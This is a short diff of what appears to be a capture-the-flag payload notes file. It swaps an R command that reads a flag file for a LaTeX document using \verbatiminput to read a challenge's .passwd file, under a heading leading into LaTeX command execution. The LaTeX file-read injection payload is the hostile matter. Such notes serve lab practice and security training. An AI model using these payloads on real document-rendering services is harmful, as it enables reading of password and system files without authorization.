@@ -17,7 +17,11 @@ read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep
 
 ### Payload 
 ```LaTex
-read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
+\documentclass{article}
+\usepackage{verbatim}
+\begin{document}
+\verbatiminput{/challenge/app-script/ch23/.passwd}
+\end{document}
 ```
 
 ## LaTeX - Command execution
